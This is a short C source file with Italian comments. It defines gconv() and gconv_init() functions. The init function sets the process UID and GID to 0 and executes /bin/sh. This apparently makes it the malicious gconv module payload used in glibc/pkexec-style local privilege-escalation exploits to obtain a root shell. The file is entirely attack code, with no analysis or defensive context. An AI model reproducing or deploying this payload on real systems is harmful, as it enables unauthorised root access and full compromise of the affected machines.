#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>    // Per setuid(), setgid(), setgroups(), execve()
#include <sys/types.h> // Per setuid(), setgid(), setgroups()

void gconv() {}

void gconv_init() {
    setuid(0);     // Imposta l'UID del processo a 0 (root)
    setgid(0);     // Imposta il GID del processo a 0 (root)
/// setgroups(0);  // Imposta i gruppi del processo (se necessario)

    execve("/bin/sh", NULL, NULL); // Esegue la shell
}
